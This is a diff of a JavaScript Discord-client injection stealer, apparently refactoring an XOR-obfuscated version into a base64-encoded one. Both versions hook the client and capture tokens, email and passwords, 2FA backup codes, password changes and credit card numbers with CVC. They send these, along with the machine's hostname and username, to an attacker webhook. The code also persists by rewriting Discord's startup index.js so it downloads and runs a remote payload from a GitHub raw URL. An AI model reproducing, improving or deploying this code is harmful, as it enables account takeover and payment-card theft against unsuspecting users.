@@ -1,320 +1,442 @@
-function _r(s){try{var b=Buffer.from(s,"base64");for(var i=0;i<b.length;i++)b[i]^=0x5A;return b.toString("utf8")}catch(e){return""}}
-const fs = require('fs');
+const fs = require('fs').promises;
 const os = require('os');
 const https = require('https');
 const path = require('path');
 const querystring = require('querystring');
 
-const {
-    app,
-    BrowserWindow,
-    session,
-} = require('electron');
+const { BrowserWindow, session } = require('electron');
 
-// ============================================================
-// Configuration
-// ============================================================
-const CFG = {
-    wh: "%WEBHOOK%",
-    // NOTE: Replace this URL with your own GitHub raw URL
-    src: "https://raw.githubusercontent.com/erendl/64/refs/heads/main/injection_original_obf.js",
-    ep: [
-        "/auth/login",
-        "/auth/register",
-        "/mfa/totp",
-        _r("dTc8O3U5NT4/KXcsPygzPDM5Oy4zNTQ="),
-        _r("dS8pPygpdRo3Pw=="),
-    ],
-    ws: [
-        _r("LSkpYHV1KD83NS4/dzsvLjJ3PTsuPy07I3Q+Myk5NSg+dD09dXA="),
-        _r("Mi4uKilgdXU+Myk5NSg+dDk1N3U7KjN1LHB1Oy8uMnUpPykpMzU0KQ=="),
-        _r("Mi4uKilgdXVwdD4zKTk1KD50OTU3dTsqM3UscHU7Ly4ydSk/KSkzNTQp"),
-        _r("Mi4uKilgdXU+Myk5NSg+OyoqdDk1N3U7KjN1LHB1Oy8uMnUpPykpMzU0KQ==")
-    ],
-    pmt: [
-        _r("Mi4uKilgdXU7KjN0OCg7MzQuKD8/PTsuPy07I3Q5NTd1Nz8oOTI7NC4pdW5jKipoKCpuKjIjN21pYm11OTYzPzQuBTsqM3UscHUqOyM3PzQuBTc/LjI1Pil1KjsjKjs2BTs5OTUvNC4p"),
-        _r("Mi4uKilgdXU7KjN0KS4oMyo/dDk1N3UscHUuNTE/NCk="),
-    ],
-    api: _r("Mi4uKilgdXU+Myk5NSg+dDk1N3U7KjN1LGN1Lyk/KCl1Gjc/"),
-    tags: {
-        Discord_Emloyee: { Value: 1, Emoji: _r("ZmBibmJvPjMpOTUoPj83KjY1Iz8/YGtrbGlrbWhob2hjYmNob2NiY2Jk"), Rare: true },
-        Partnered_Server_Owner: { Value: 2, Emoji: _r("ZmBjY2hiPjMpOTUoPio7KC40Pyg4Oz49P2Bra2xpa21oaWpua29vb2Jsb21qZA=="), Rare: true },
-        HypeSquad_Events: { Value: 4, Emoji: _r("ZmBja21rMiMqPykrLzs+Pyw/NC4pYGtrbGlrbWhobmJrbmpsbGpiaWNk"), Rare: true },
-        Bug_Hunter_Level_1: { Value: 8, Emoji: _r("ZmBubW5uOC89Mi80Lj8oODs+PT8+Myk5NSg+YGtrbGlrbWhoaWNjbWprbmppYmlk"), Rare: true },
-        Early_Supporter: { Value: 512, Emoji: _r("ZmBvam9pPzsoNiMpLyoqNSguPyhga2tsaWttaGhua2NjbGpqb25rbGQ="), Rare: true },
-        Bug_Hunter_Level_2: { Value: 16384, Emoji: _r("ZmBrbW9tOC89OC8pLj8oODs+PT8+Myk5NSg+YGtrbGlrbWhoaWJjbmhvbmliY2hk"), Rare: true },
-        Early_Verified_Bot_Developer: { Value: 131072, Emoji: _r("ZmBraGptMzk1ND87KDYjODUuPj8sPzY1Kj8oYGtrbGlrbWhoaWxiam1saWNrbmlk"), Rare: true },
-        House_Bravery: { Value: 64, Emoji: _r("ZmBsbGprMiMqPykrLzs+OCg7LD8oI2Bra2xpa21oaG5sbmNoaGJtamttZA=="), Rare: false },
-        House_Brilliance: { Value: 128, Emoji: _r("ZmBsY2lsMiMqPykrLzs+OCgzNjYzOzQ5P2Bra2xpa21oaG5ubm1uYmhobW5sZA=="), Rare: false },
-        House_Balance: { Value: 256, Emoji: _r("ZmBvaG5oMiMqPykrLzs+ODs2OzQ5P2Bra2xpa21oaG5pbmttYm9ia2hiZA=="), Rare: false },
-        Active_Developer: { Value: 4194304, Emoji: _r("ZmBraGptMzk1NDs5LjMsPz4/LD82NSo/KGBra2xpa21ob2lubm5pYm9rYmxiZA=="), Rare: false },
-        Certified_Moderator: { Value: 262144, Emoji: _r("ZmBua25jODYvKCo2Pzk/KC4zPDM/Pjc1Pj8oOy41KGBra2xpa21oaG9vbmJjamJvbmJrZA=="), Rare: true },
-        Spammer: { Value: 1048704, Emoji: _r("uNbyteLV"), Rare: false },
+// Helper function to check if a file exists
+const exists = async (p) => {
+    try {
+        await fs.access(p);
+        return true;
+    } catch {
+        return false;
+    }
+};
+
+// Decode base64 strings
+const decodeBase64 = (str) => Buffer.from(str, 'base64').toString('utf8');
+
+// Obfuscated and Base64-encoded static strings
+const CONFIG_BASE64 = {
+    webhook: "%WEBHOOK%",
+    injection_url: "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VyZW5kbC82NC9tYWluL2luamVjdGlvbl9vcmlnaW5hbF9vYmYuanM=",
+    filters: {
+        urls: [
+            "L2F1dGgvbG9naW4=",
+            "L2F1dGgvcmlnZXN0ZXI=",
+            "L21mYS90b3Rw",
+            "L21mYS9jb2Rlc3MtdmVyaWZpY2F0aW9u",
+            "L3VzZXJzL0BtZQ==",
+        ],
+    },
+    filters2: {
+        urls: [
+            "d3NzOi8vcmVtb3RlLWF1dGgtZ2F0ZXdheS5kaXNjb3JkLmdnLyo=",
+            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdnovYXV0aC9zZXNzaW9ucw==",
+            "aHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki9hdXRoL3Nlc3Npb25z",
+            "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdnovYXV0aC9zZXNzaW9ucw==",
+        ],
+    },
+    payment_filters: {
+        urls: [
+            "aHR0cHM6Ly9hcGkuYnJhaW50cmVlZ2F0ZXcuanMvTWVyY2hhbnRzLzQ5cHAycnA0cGh5NzM4Ny9jbGllbnRfYXBpL3YqL3BheW1lbnRfbWV0aG9kcy9wYXlwYWwgYWNjb3VudHM=",
+            "aHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki90b2tlbnM=",
+        ],
+    },
+    API: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkv",
+    badges: {
+        Discord_Employee: {
+            Value: 1,
+            Emoji: "PDw4NDg1ZGlzY29yZGVuZXBsb3llZToxMTYzMTcyMjUyOTg5MjU5ODk4Pg==",
+            Rare: true,
+        },
+        Partnered_Server_Owner: {
+            Value: 2,
+            Emoji: "PDw5OTI4ZGlzY29yZHBhcnRuZXJiYWRnZToxMTYzMTcyMzA0MTU1NTg2NTcwPg==",
+            Rare: true,
+        },
+        HypeSquad_Events: {
+            Value: 4,
+            Emoji: "PDw5MTcxSFlwc3F1YWRldmVudHM6MTE2MzE3MjI0ODE0MDY2MDgzOT4=",
+            Rare: true,
+        },
+        Bug_Hunter_Level_1: {
+            Value: 8,
+            Emoji: "PDw0NzQ0YnVnaHVudGVyYmFkZ2VkaXNjb3JkOjExNjMxNzIyMzk5NzAxNDAzODM+",
+            Rare: true,
+        },
+        Early_Supporter: {
+            Value: 512,
+            Emoji: "PDw1MDUzZXJseXN1cHBvcnRlcmRpc2NvcmQ6MTE2MzE3MjI0MTk5NjAwNTQxNj4=",
+            Rare: true,
+        },
+        Bug_Hunter_Level_2: {
+            Value: 16384,
+            Emoji: "PDwxNzU3YnVnYnVzdGVyYmFkZ2VkaXNjb3JkOjExNjMxNzIyMzg5NDI1NDM4OTI+",
+            Rare: true,
+        },
+        Early_Verified_Bot_Developer: {
+            Value: 131072,
+            Emoji: "PDwxMjA3aWNvbmVhcnRseWJvdGRldmVsb3BlcmRpc2NvcmQ6MTE2MzE3MjIzNjgwNzc5MTQzPg==",
+            Rare: true,
+        },
+        House_Bravery: {
+            Value: 64,
+            Emoji: "PDw2NjAxSFlwc3F1YWRicmF2ZXJ5OjExNjMxNzIyNDY0OTIyODcwMTc+",
+            Rare: false,
+        },
+        House_Brilliance: {
+            Value: 128,
+            Emoji: "PDw2OTM2SFlwc3F1YWRicmlsbGlhbmNlOjExNjMxNzIyNDQ0NzQ4MjI3NDY+",
+            Rare: false,
+        },
+        House_Balance: {
+            Value: 256,
+            Emoji: "PDw1MjQyaHlzZXF1YWRiYWxhbmNlOjExNjMxNzIyNDM0MTc4NTgxMjg+",
+            Rare: false,
+        },
+        Active_Developer: {
+            Value: 4194304,
+            Emoji: "PDwxMjA3aWNvbmFjdGl2ZWRldmVsb3BlcmRpc2NvcmQ6MTE2MzE3MjUzNDQ0Mzg1MTg2OD4=",
+            Rare: false,
+        },
+        Certified_Moderator: {
+            Value: 262144,
+            Emoji: "PDw0MTQ5Ymx1cnBsZWNtb2RlcmF0b3JkaXNjb3JkOjExNjMxNzIyNTU0ODkwODY1NDgxPg==",
+            Rare: true,
+        },
+        Spammer: {
+            Value: 1048704,
+            Emoji: "8a9a",
+            Rare: false,
+        },
     },
 };
 
-// ============================================================
-// Utility helpers
-// ============================================================
-const execJS = script => {
-    const w = BrowserWindow.getAllWindows()[0];
-    return w.webContents.executeJavaScript(script, !0);
+// Decode CONFIG_BASE64 to CONFIG
+// Decode CONFIG_BASE64 to CONFIG
+const CONFIG = {
+    webhook: CONFIG_BASE64.webhook,
+    injection_url: decodeBase64(CONFIG_BASE64.injection_url),
+    filters: {
+        urls: CONFIG_BASE64.filters.urls.map(decodeBase64),
+    },
+    filters2: {
+        urls: CONFIG_BASE64.filters2.urls.map(decodeBase64),
+    },
+    payment_filters: {
+        urls: CONFIG_BASE64.payment_filters.urls.map(decodeBase64),
+    },
+    API: decodeBase64(CONFIG_BASE64.API),
+    badges: CONFIG_BASE64.badges,
 };
 
-const flushLocal = () => {
-    execJS(`
-        try {
-            window.webpackChunkdiscord_app.push([[''],{},e=>{
-                for(let c in e.c){
-                    let m = e.c[c]?.exports?.default;
-                    if(m && typeof m.logout === 'function') {
-                        m.logout();
-                        return;
-                    }
-                }
-            }]);
-        } catch(e) {}
-        try {
-            document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.clear();
-            sessionStorage.clear();
-        } catch(e) {}
-        location.reload();
-    `);
+const executeJS = script => {
+    const window = BrowserWindow.getAllWindows()[0];
+    return window.webContents.executeJavaScript(script, true);
 };
 
-const readSession = async () => await execJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+const clearAllUserData = async () => {
+    await executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
+    await executeJS("location.reload()");
+};
 
-const netReq = async (method, url, headers, data) => {
-    url = new URL(url);
-    const options = {
-        protocol: url.protocol,
-        hostname: url.host,
-        path: url.pathname,
-        method: method,
-        headers: { "Access-Control-Allow-Origin": "*" },
-    };
-    if (url.search) options.path += url.search;
-    for (const key in headers) options.headers[key] = headers[key];
-    const req = https.request(options);
-    if (data) req.write(data);
-    req.end();
+const getToken = async () => {
+    return executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+};
 
+const request = async (method, url, headers = {}, data = null) => {
     return new Promise((resolve, reject) => {
-        req.on("response", res => {
+        const options = new URL(url);
+        const req = https.request({
+            method: method,
+            hostname: options.hostname,
+            path: options.pathname + options.search,
+            headers: headers
+        }, (res) => {
             let data = "";
             res.on("data", chunk => data += chunk);
-            res.on("end", () => resolve(data));
+            res.on("end", () => {
+                try {
+                    resolve(JSON.parse(data));
+                } catch (e) {
+                    resolve(data);
+                }
+            });
+        }).on("error", (err) => {
+            reject(err);
         });
+
+        if (data) req.write(data);
+        req.end();
     });
 };
 
-// ============================================================
-// Data collection helpers
-// ============================================================
-const getPlan = flags => {
+const hooker = async (content, token, account) => {
+    content["content"] = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n\n${content["content"]}`;
+    content["username"] = decodeBase64("Z28tc3RlYWxlciBieSB3aDEtd2luc3NlcyAtIGNvcmQgaW5qZWN0aW9u");
+    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+    content["embeds"][0]["author"] = {
+        "name": account.username,
+    };
+    content["embeds"][0]["thumbnail"] = {
+        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
+    };
+    content["embeds"][0]["footer"] = {
+        "text": "discord injection - made by s1q1q",
+        "icon_url": decodeBase64("aHR0cHM6Ly9hdmF0YXJzLmdpdGh1YnVzZXJjb250ZW50LmNvbS91LzE0NTQ4Nzg0NT92PTQ="),
+    };
+    content["embeds"][0]["title"] = "Account Information";
+
+    const nitro = getNitro(account.premium_type);
+    const badges = getBadges(account.flags);
+    const billing = await getBilling(token);
+
+    const friends = await getFriends(token);
+    const servers = await getServers(token);
+
+    content["embeds"][0]["fields"].push({
+        "name": "Token",
+        "value": `\`\`\`${token}\`\`\``,
+        "inline": false
+    }, {
+        "name": "Nitro",
+        "value": nitro,
+        "inline": true
+    }, {
+        "name": "Badges",
+        "value": badges,
+        "inline": true
+    }, {
+        "name": "Billing",
+        "value": billing,
+        "inline": true
+    });
+
+    content["embeds"].push({
+        "title": `Total Friends: ${friends.totalFriends}`,
+        "description": friends.message,
+    }, {
+        "title": `Total Servers: ${servers.totalGuilds}`,
+        "description": servers.message,
+    });
+
+    for (const embed in content["embeds"]) {
+        content["embeds"][embed]["color"] = 0xb143e3;
+    }
+
+    await request("POST", CONFIG.webhook, {
+        "Content-Type": "application/json"
+    }, JSON.stringify(content));
+};
+
+const fetch = async (endpoint, headers = {}) => {
+    return request("GET", CONFIG.API + endpoint, headers);
+};
+
+const fetchAccount = async token => await fetch("", { "Authorization": token });
+const fetchBilling = async token => await fetch("/billing/payment-sources", { "Authorization": token });
+const fetchServers = async token => await fetch("/guilds?with_counts=true", { "Authorization": token });
+const fetchFriends = async token => await fetch("/relationships", { "Authorization": token });
+
+const getNitro = flags => {
     switch (flags) {
-        case 1: return '`Nitro Classic`';
-        case 2: return '`Nitro Boost`';
-        case 3: return '`Nitro Basic`';
-        default: return '`❌`';
+        case 1:
+            return '`Nitro Classic`';
+        case 2:
+            return '`Nitro Boost`';
+        case 3:
+            return '`Nitro Basic`';
+        default:
+            return '`❌`';
     }
 };
 
-const getTags = flags => {
-    let tags = '';
-    for (const tag in CFG.tags) {
-        let b = CFG.tags[tag];
-        if ((flags & b.Value) == b.Value) tags += b.Emoji + ' ';
+const getBadges = flags => {
+    let badges = '';
+    for (const badge in CONFIG.badges) {
+        const b = CONFIG.badges[badge];
+        if ((flags & b.Value) === b.Value) badges += `${decodeBase64(b.Emoji)} `;
     }
-    return tags || '`❌`';
+    return badges || '`❌`';
 };
 
-const getRareTags = flags => {
-    let tags = '';
-    for (const tag in CFG.tags) {
-        let b = CFG.tags[tag];
-        if ((flags & b.Value) == b.Value && b.Rare) tags += b.Emoji + ' ';
+const getRareBadges = flags => {
+    let badges = '';
+    for (const badge in CONFIG.badges) {
+        const b = CONFIG.badges[badge];
+        if ((flags & b.Value) === b.Value && b.Rare) badges += `${decodeBase64(b.Emoji)} `;
     }
-    return tags;
+    return badges;
 };
 
-const fetchInfo = async (endpoint, headers) => {
-    return JSON.parse(await netReq("GET", CFG.api + endpoint, headers));
-};
-
-const readProfile = async token => await fetchInfo("", { "Authorization": token });
-const readBilling = async token => await fetchInfo(_r("dTgzNjYzND11KjsjNz80LncpNS8oOT8p"), { "Authorization": token });
-const readServers = async token => await fetchInfo(_r("dT0vMzY+KWUtMy4yBTk1LzQuKWcuKC8/"), { "Authorization": token });
-const readFriends = async token => await fetchInfo("/relationships", { "Authorization": token });
-
-const getPayment = async token => {
-    const data = await readBilling(token);
+const getBilling = async token => {
+    const data = await fetchBilling(token);
     let billing = '';
     data.forEach((x) => {
         if (!x.invalid) {
             switch (x.type) {
-                case 1: billing += '💳 '; break;
-                case 2: billing += '<:paypal:1148653305376034967> '; break;
+                case 1:
+                    billing += '💳 ';
+                    break;
+                case 2:
+                    billing += '<:paypal:1148653305376034967> ';
+                    break;
             }
         }
     });
     return billing || '`❌`';
 };
 
-const getContacts = async token => {
-    const friends = await readFriends(token);
-    const filteredFriends = friends.filter((user) => user.type == 1);
+const getFriends = async token => {
+    const friends = await fetchFriends(token);
+    const filteredFriends = friends.filter(user => user.type === 1);
     let rareUsers = "";
     for (const acc of filteredFriends) {
-        var tags = getRareTags(acc.user.public_flags);
-        if (tags != "") {
-            if (!rareUsers) rareUsers = _r("cHAIOyg/ehwoMz80PilgcHAGNA==");
-            rareUsers += `${tags} ${acc.user.username}\n`;
+        const badges = getRareBadges(acc.user.public_flags);
+        if (badges) {
+            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
+            rareUsers += `${badges} ${acc.user.username}\n`;
         }
     }
-    rareUsers = rareUsers || _r("cHAUNXoIOyg/ehwoMz80PilwcA==");
-    return { message: rareUsers, totalFriends: friends.length };
+    rareUsers = rareUsers || "**No Rare Friends**";
+    return {
+        message: rareUsers,
+        totalFriends: friends.length,
+    };
 };
 
-const getGuilds = async token => {
-    const guilds = await readServers(token);
-    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
+const getServers = async token => {
+    const guilds = await fetchServers(token);
+    const filteredGuilds = guilds.filter(guild => guild.permissions === '562949953421311' || guild.permissions === '2251799813685247');
     let rareGuilds = "";
-    for (const guild of filteredGuilds) {
-        if (rareGuilds === "") rareGuilds += `**Rare Servers:**\n`;
-        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : _r("ZmA7PjczNGBjbG1ib2tjb2xjaWpuYmhoamxkehs+NzM0")} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+    if (filteredGuilds.length > 0) {
+        rareGuilds = `**Rare Servers:**\n`;
+        for (const guild of filteredGuilds) {
+            rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+        }
+    } else {
+        rareGuilds = "**No Rare Servers**";
     }
-    rareGuilds = rareGuilds || _r("cHAUNXoIOyg/egk/KCw/KClwcA==");
-    return { message: rareGuilds, totalGuilds: guilds.length };
+    return {
+        message: rareGuilds,
+        totalGuilds: guilds.length,
+    };
 };
 
-// ============================================================
-// Dispatch helpers
-// ============================================================
-const dispatch = async (payload, token, account) => {
-    payload["content"] = "`" + os.hostname() + _r("Onp3ejo=") + os.userInfo().username + _r("OgY0BjQ=") + payload["content"];
-    payload["username"] = _r("CT85LygzLiN6FzU0My41KA==");
-    payload["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
-    payload["embeds"][0]["author"] = { "name": account.username };
-    payload["embeds"][0]["thumbnail"] = {
-        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
-    };
-    payload["embeds"][0]["footer"] = {
-        "text": _r("KT8pKTM1NHo7Lz4zLg=="),
-        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
-    };
-    payload["embeds"][0]["title"] = _r("Gzk5NS80LnoTNDw1KDc7LjM1NA==");
-
-    const nitro = getPlan(account.premium_type);
-    const tags = getTags(account.flags);
-    const billing = await getPayment(token);
-    const friends = await getContacts(token);
-    const servers = await getGuilds(token);
-
-    payload["embeds"][0]["fields"].push(
-        { "name": "Token", "value": "```" + token + "```", "inline": false },
-        { "name": "Nitro", "value": nitro, "inline": true },
-        { "name": "Badges", "value": tags, "inline": true },
-        { "name": "Billing", "value": billing, "inline": true }
-    );
-
-    payload["embeds"].push(
-        { "title": `Total Friends: ${friends.totalFriends}`, "description": friends.message },
-        { "title": `Total Servers: ${servers.totalGuilds}`, "description": servers.message }
-    );
-
-    for (const embed in payload["embeds"]) {
-        payload["embeds"][embed]["color"] = 0xb143e3;
-    }
-
-    await netReq("POST", CFG.wh, { "Content-Type": _r("OyoqNjM5Oy4zNTR1MCk1NA==") }, JSON.stringify(payload));
-};
-
-// ============================================================
-// Event handlers
-// ============================================================
-const onAuthEvent = async (email, password, token, action) => {
-    const account = await readProfile(token);
-    const payload = {
+const EmailPassToken = async (email, password, token, action) => {
+    const account = await fetchAccount(token);
+    const content = {
         "content": `**${account.username}** just ${action}!`,
         "embeds": [{
-            "fields": [
-                { "name": "Email", "value": "`" + email + "`", "inline": true },
-                { "name": "Password", "value": "`" + password + "`", "inline": true }
-            ]
+            "fields": [{
+                "name": "Email",
+                "value": `\`${email}\``,
+                "inline": true
+            }, {
+                "name": "Password",
+                "value": `\`${password}\``,
+                "inline": true
+            }]
         }]
     };
-    dispatch(payload, token, account);
+    await hooker(content, token, account);
 };
 
-const onCodesEvent = async (codes, token) => {
-    const account = await readProfile(token);
-    const filteredCodes = codes.filter((code) => code.consumed === false);
+const BackupCodesViewed = async (codes, token) => {
+    const account = await fetchAccount(token);
+    const filteredCodes = codes.filter(code => code.consumed === false);
     let message = "";
-    for (let code of filteredCodes) {
+    for (const code of filteredCodes) {
         message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
     }
-    const payload = {
+    const content = {
         "content": `**${account.username}** just viewed his 2FA backup codes!`,
         "embeds": [{
-            "fields": [
-                { "name": _r("GDs5MS8qehk1Pj8p"), "value": "```" + message + "```", "inline": false },
-                { "name": "Email", "value": "`" + account.email + "`", "inline": true },
-                { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
-            ]
+            "fields": [{
+                "name": "Backup Codes",
+                "value": `\`\`\`${message}\`\`\``,
+                "inline": false
+            }, {
+                "name": "Email",
+                "value": `\`${account.email}\``,
+                "inline": true
+            }, {
+                "name": "Phone",
+                "value": `\`${account.phone || "None"}\``,
+                "inline": true
+            }]
         }]
     };
-    dispatch(payload, token, account);
+    await hooker(content, token, account);
 };
 
-const onPassEvent = async (newPassword, oldPassword, token) => {
-    const account = await readProfile(token);
-    const payload = {
+const PasswordChanged = async (newPassword, oldPassword, token) => {
+    const account = await fetchAccount(token);
+    const content = {
         "content": `**${account.username}** just changed his password!`,
         "embeds": [{
-            "fields": [
-                { "name": _r("FD8tego7KSktNSg+"), "value": "`" + newPassword + "`", "inline": true },
-                { "name": _r("FTY+ego7KSktNSg+"), "value": "`" + oldPassword + "`", "inline": true }
-            ]
+            "fields": [{
+                "name": "New Password",
+                "value": `\`${newPassword}\``,
+                "inline": true
+            }, {
+                "name": "Old Password",
+                "value": `\`${oldPassword}\``,
+                "inline": true
+            }]
         }]
     };
-    dispatch(payload, token, account);
+    await hooker(content, token, account);
 };
 
-const onCardEvent = async (number, cvc, month, year, token) => {
-    const account = await readProfile(token);
-    const payload = {
+const CreditCardAdded = async (number, cvc, month, year, token) => {
+    const account = await fetchAccount(token);
+    const content = {
         "content": `**${account.username}** just added a credit card!`,
         "embeds": [{
-            "fields": [
-                { "name": "Number", "value": "`" + number + "`", "inline": true },
-                { "name": "CVC", "value": "`" + cvc + "`", "inline": true },
-                { "name": "Expiration", "value": "`" + month + "/" + year + "`", "inline": true }
-            ]
+            "fields": [{
+                "name": "Number",
+                "value": `\`${number}\``,
+                "inline": true
+            }, {
+                "name": "CVC",
+                "value": `\`${cvc}\``,
+                "inline": true
+            }, {
+                "name": "Expiration",
+                "value": `\`${month}/${year}\``,
+                "inline": true
+            }]
         }]
     };
-    dispatch(payload, token, account);
+    await hooker(content, token, account);
 };
 
-const onPaypalEvent = async (token) => {
-    const account = await readProfile(token);
-    const payload = {
+const PaypalAdded = async (token) => {
+    const account = await fetchAccount(token);
+    const content = {
         "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
         "embeds": [{
-            "fields": [
-                { "name": "Email", "value": "`" + account.email + "`", "inline": true },
-                { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
-            ]
+            "fields": [{
+                "name": "Email",
+                "value": `\`${account.email}\``,
+                "inline": true
+            }, {
+                "name": "Phone",
+                "value": `\`${account.phone || "None"}\``,
+                "inline": true
+            }]
         }]
     };
-    dispatch(payload, token, account);
+    await hooker(content, token, account);
 };
 
-// ============================================================
-// Injection bootstrapper
-// ============================================================
-const locatePaths = (function () {
-    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
+const discordPath = (function () {
+    const app = __dirname.split(path.sep).slice(0, -1).join(path.sep);
     let resourcePath;
 
     if (process.platform === 'win32') {
@@ -323,110 +445,115 @@ const locatePaths = (function () {
         resourcePath = path.join(app, 'Contents', 'Resources');
     }
 
-    if (fs.existsSync(resourcePath)) return { resourcePath, app };
-    return { undefined, undefined };
+    return { resourcePath, app };
 })();
 
-async function bootstrap() {
-    const isFirstInject = fs.existsSync(path.join(__dirname, 'initiation'));
-    if (isFirstInject) {
-        try { fs.rmdirSync(path.join(__dirname, 'initiation')); } catch (e) {}
-    }
+const initiation = async () => {
+    const initiationDir = path.join(__dirname, 'initiation');
+    try {
+        if (await exists(initiationDir)) {
+            await fs.rm(initiationDir, { recursive: true, force: true });
 
-    const token = await readSession();
-    if (token) {
-        const account = await readProfile(token);
-        const actionMsg = isFirstInject ? "just got injected!" : "restarted Discord / session active!";
-        const payload = {
-            "content": `**${account.username}** ${actionMsg}`,
-            "embeds": [{
-                "fields": [
-                    { "name": "Email", "value": "`" + account.email + "`", "inline": true },
-                    { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
-                ]
-            }]
-        };
-        await dispatch(payload, token, account);
-        if (isFirstInject) {
-            flushLocal();
+            const token = await getToken();
+            if (!token) return;
+
+            const account = await fetchAccount(token);
+            const content = {
+                "content": `**${account.username}** just got injected!`,
+                "embeds": [{
+                    "fields": [{
+                        "name": "Email",
+                        "value": `\`${account.email}\``,
+                        "inline": true
+                    }, {
+                        "name": "Phone",
+                        "value": `\`${account.phone || "None"}\``,
+                        "inline": true
+                    }]
+                }]
+            };
+            await hooker(content, token, account);
+            await clearAllUserData();
         }
+    } catch (err) {
+        console.error("Initiation error:", err);
     }
+};
 
-    const { resourcePath, app } = locatePaths;
-    if (resourcePath === undefined || app === undefined) return;
+(async () => {
+    const { resourcePath, app } = discordPath;
+    if (!resourcePath || !app) return;
+
     const appPath = path.join(resourcePath, 'app');
-    const pkgJson = path.join(appPath, 'package.json');
-    const resIndex = path.join(appPath, 'index.js');
-    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0];
-    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
-    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
-    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
-    if (fs.existsSync(pkgJson)) fs.unlinkSync(pkgJson);
-    if (fs.existsSync(resIndex)) fs.unlinkSync(resIndex);
+    const packageJson = path.join(appPath, 'package.json');
+    const resourceIndex = path.join(appPath, 'index.js');
+    const coreVal = (await fs.readdir(path.join(app, 'modules'))).find(x => /discord_desktop_core-+?/.test(x));
+    const indexJs = path.join(app, 'modules', coreVal, 'discord_desktop_core', 'index.js');
+    const bdPath = path.join(process.platform === 'win32' ? process.env.APPDATA : process.env.HOME, 'betterdiscord', 'data', 'betterdiscord.asar');
 
-    if (process.platform === 'win32' || process.platform === 'darwin') {
-        fs.writeFileSync(pkgJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
+    try {
+        if (!await exists(appPath)) await fs.mkdir(appPath);
+        if (await exists(packageJson)) await fs.unlink(packageJson);
+        if (await exists(resourceIndex)) await fs.unlink(resourceIndex);
 
-        const loaderScript = `const fs = require('fs'), https = require('https');
-  const indexJs = '${indexJs}';
-  const bdPath = '${bdPath}';
-  const fileSize = fs.statSync(indexJs).size;
-  fs.readFileSync(indexJs, 'utf8', (err, data) => {
-      if (fileSize < 20000 || data === _r("NzU+LzY/dD8iKjUoLil6Z3ooPysvMyg/cn10dTk1KD90Oyk7KH1z")) 
-          init();
-  })
-  async function init() {
-      https.get('${CFG.src}', (res) => {
-          const file = fs.createWriteStream(indexJs);
-          res.replace('%WEBHOOK%', '${CFG.wh}');
-          res.pipe(file);
-          file.on('finish', () => { file.close(); });
-      }).on("error", (err) => { setTimeout(init(), 10000); });
-  }
-  require('${path.join(resourcePath, 'app.asar')}')
-  if (fs.existsSync(bdPath)) require(bdPath);`;
-        fs.writeFileSync(resIndex, loaderScript.replace(/\\/g, '\\\\'));
+        if (process.platform === 'win32' || process.platform === 'darwin') {
+            const startUpScript = `
+                const fs = require('fs');
+                const https = require('https');
+                const indexJs = '${indexJs}';
+                const bdPath = '${bdPath}';
+                fs.stat(indexJs, (err, stats) => {
+                    if (err || stats.size < 20000) {
+                        init();
+                    }
+                });
+                function init() {
+                    https.get('${CONFIG.injection_url}', (res) => {
+                        const file = fs.createWriteStream(indexJs);
+                        res.pipe(file);
+                        file.on('finish', () => {
+                            file.close();
+                        });
+                    }).on("error", (err) => {
+                        setTimeout(init, 10000);
+                    });
+                }
+                require('${path.join(resourcePath, 'app.asar')}')
+                if (fs.existsSync(bdPath)) require(bdPath);
+            `;
+            await fs.writeFile(resourceIndex, startUpScript);
+        }
+    } catch (err) {
+        console.error("File operations error:", err);
     }
-}
+})();
 
 let email = "";
 let password = "";
-let bootstrapped = false;
+let initiationCalled = false;
+const createWindow = () => {
+    const mainWindow = BrowserWindow.getAllWindows()[0];
+    if (!mainWindow) return;
 
-const attachToWindow = (mainWindow) => {
-    if (!mainWindow || mainWindow.isDestroyed()) return;
-
-    mainWindow.webContents.on('did-finish-load', async () => {
-        if (!bootstrapped) {
-            bootstrapped = true;
-            setTimeout(async () => {
-                try {
-                    await bootstrap();
-                } catch (e) {}
